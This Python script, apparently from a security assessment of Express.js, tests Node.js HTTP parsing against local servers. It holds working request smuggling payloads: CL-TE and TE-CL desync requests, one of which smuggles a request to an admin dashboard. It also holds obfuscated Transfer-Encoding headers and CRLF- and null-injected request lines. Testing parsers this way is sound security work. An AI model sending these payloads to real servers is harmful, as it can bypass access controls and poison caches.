#!/usr/bin/env python3
"""
Phase 3.5 — HTTP Request Smuggling
Express.js Security Assessment — [REDACTED]

Tests Node.js HTTP parser behavior for request smuggling.
SCOPE: Node.js HTTP server (used by Express) parser quirks.
"""

import socket
import json
import os
import time
from datetime import datetime

TARGETS = {'v5': ('127.0.0.1', 3000), 'v4': ('127.0.0.1', 3001)}
EVIDENCE_DIR = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/evidence'

results = {
    'metadata': {'phase': '3.5', 'name': 'HTTP Request Smuggling', 'timestamp': datetime.now().isoformat(),
                 'scope': 'Node.js HTTP parser behavior'},
    'tests': [], 'findings': [], 'anomalies': [], 'summary': {}
}
test_count = 0
anomaly_count = 0

def log_test(name, ver, data, finding=None, anomaly=None):
    global test_count, anomaly_count
    test_count += 1
    results['tests'].append({'id': test_count, 'test': name, 'version': ver, 'data': data})
    if finding:
        results['findings'].append({'id': len(results['findings'])+1, **finding, 'version': ver})
        print(f"  [{test_count:3d}] ⚠ {name} ({ver})")
    elif anomaly:
        anomaly_count += 1
        results['anomalies'].append({'id': anomaly_count, **anomaly, 'version': ver})
        print(f"  [{test_count:3d}] ? {name} ({ver})")
    else:
        print(f"  [{test_count:3d}] ✓ {name} ({ver})")


def send_raw(host, port, data, timeout=5):
    """Send raw HTTP data and get response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.send(data)
        response = b''
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        sock.close()
        return response
    except Exception as e:
        return str(e).encode()


def test_cl_te_smuggling():
    """Test CL-TE desync"""
    print("\n[*] Testing CL-TE request smuggling...")

    payloads = [
        ('cl_te_basic',
         b'POST /method-test HTTP/1.1\r\n'
         b'Host: 127.0.0.1\r\n'
         b'Content-Length: 13\r\n'
         b'Transfer-Encoding: chunked\r\n'
         b'\r\n'
         b'0\r\n'
         b'\r\n'
         b'SMUGGLED'),

        ('cl_te_prefix_method',
         b'POST /method-test HTTP/1.1\r\n'
         b'Host: 127.0.0.1\r\n'
         b'Content-Length: 44\r\n'
         b'Transfer-Encoding: chunked\r\n'
         b'\r\n'
         b'0\r\n'
         b'\r\n'
         b'GET /admin/dashboard HTTP/1.1\r\n'
         b'Host: 127.0.0.1\r\n'
         b'\r\n'),

        ('te_cl_basic',
         b'POST /method-test HTTP/1.1\r\n'
         b'Host: 127.0.0.1\r\n'
         b'Transfer-Encoding: chunked\r\n'
         b'Content-Length: 3\r\n'
         b'\r\n'
         b'1\r\n'
         b'A\r\n'
         b'0\r\n'
         b'\r\n'),
    ]

    for ver, (host, port) in TARGETS.items():
        for name, payload in payloads:
            response = send_raw(host, port, payload)
            status = response.split(b'\r\n')[0].decode('utf-8', errors='replace') if response else 'NO RESPONSE'

            finding = None
            anomaly = None

            # Check for smuggled request handling
            response_count = response.count(b'HTTP/1.1')
            if response_count > 1:
                finding = {
                    'title': f'HTTP Smuggling: Multiple Responses ({name})',
                    'severity': 'HIGH', 'cwe': 'CWE-444',
                    'description': f'Node.js returned {response_count} responses — possible request smuggling',
                    'framework_behavior': True
                }
            elif b'400' not in response and b'SMUGGLED' in payload and b'200' in response:
                anomaly = {'test': name, 'desc': f'Accepted potentially smuggled request: {status}'}

            log_test(f'smuggle_{name}', ver, {
                'status_line': status, 'response_size': len(response),
                'response_count': response_count,
                'response_preview': response[:300].decode('utf-8', errors='replace')
            }, finding, anomaly)


def test_te_obfuscation():
    """Test Transfer-Encoding obfuscation"""
    print("\n[*] Testing TE header obfuscation...")

    te_variants = [
        ('te_space_before', b'Transfer-Encoding : chunked'),
        ('te_space_after', b'Transfer-Encoding: chunked '),
        ('te_tab', b'Transfer-Encoding:\tchunked'),
        ('te_newline_fold', b'Transfer-Encoding:\r\n chunked'),
        ('te_mixed_case', b'Transfer-Encoding: cHuNkEd'),
        ('te_double', b'Transfer-Encoding: chunked\r\nTransfer-Encoding: identity'),
        ('te_comma', b'Transfer-Encoding: chunked, identity'),
        ('te_x_prefix', b'X-Transfer-Encoding: chunked'),
        ('te_null', b'Transfer-Encoding: chunked\x00'),
        ('te_vertical_tab', b'Transfer-Encoding:\x0bchunked'),
    ]

    for ver, (host, port) in TARGETS.items():
        for name, te_header in te_variants:
            payload = (
                b'POST /method-test HTTP/1.1\r\n'
                b'Host: 127.0.0.1\r\n'
                + te_header + b'\r\n'
                b'Content-Length: 5\r\n'
                b'\r\n'
                b'0\r\n\r\n'
            )

            response = send_raw(host, port, payload)
            status = response.split(b'\r\n')[0].decode('utf-8', errors='replace') if response else 'NO RESPONSE'

            anomaly = None
            if b'200' in response:
                anomaly = {'test': name, 'desc': f'Accepted with obfuscated TE: {status}'}

            log_test(f'te_{name}', ver, {
                'te_header': te_header.decode('utf-8', errors='replace'),
                'status_line': status
            }, anomaly=anomaly)


def test_request_line_parsing():
    """Test request line parsing quirks"""
    print("\n[*] Testing request line parsing...")

    request_lines = [
        ('normal', b'GET /health HTTP/1.1\r\n'),
        ('http_09', b'GET /health\r\n'),
        ('http_20', b'GET /health HTTP/2.0\r\n'),
        ('http_30', b'GET /health HTTP/3.0\r\n'),
        ('extra_spaces', b'GET  /health  HTTP/1.1\r\n'),
        ('tab_separator', b'GET\t/health\tHTTP/1.1\r\n'),
        ('abs_uri', b'GET http://127.0.0.1:3000/health HTTP/1.1\r\n'),
        ('long_method', b'AAAAAAAAAAAAA /health HTTP/1.1\r\n'),
        ('null_in_path', b'GET /hea\x00lth HTTP/1.1\r\n'),
        ('crlf_in_path', b'GET /health\r\nInjected: true HTTP/1.1\r\n'),
    ]

    for ver, (host, port) in TARGETS.items():
        for name, req_line in request_lines:
            payload = req_line + b'Host: 127.0.0.1\r\n\r\n'
            response = send_raw(host, port, payload)
            status = response.split(b'\r\n')[0].decode('utf-8', errors='replace') if response else 'NO RESPONSE'

            log_test(f'reqline_{name}', ver, {
                'request_line': req_line.decode('utf-8', errors='replace')[:100],
                'status_line': status
            })


def main():
    print("=" * 70)
    print("Phase 3.5 — HTTP Request Smuggling")
    print("=" * 70)

    test_cl_te_smuggling()
    test_te_obfuscation()
    test_request_line_parsing()

    results['summary'] = {'total_tests': test_count, 'findings_count': len(results['findings']), 'anomalies_count': anomaly_count}
    out_file = os.path.join(EVIDENCE_DIR, 'smuggling_results.json')
    with open(out_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nSmuggling tests complete: {test_count} tests, {len(results['findings'])} findings, {anomaly_count} anomalies")
    print(f"Evidence: {out_file}")

if __name__ == '__main__':
    main()
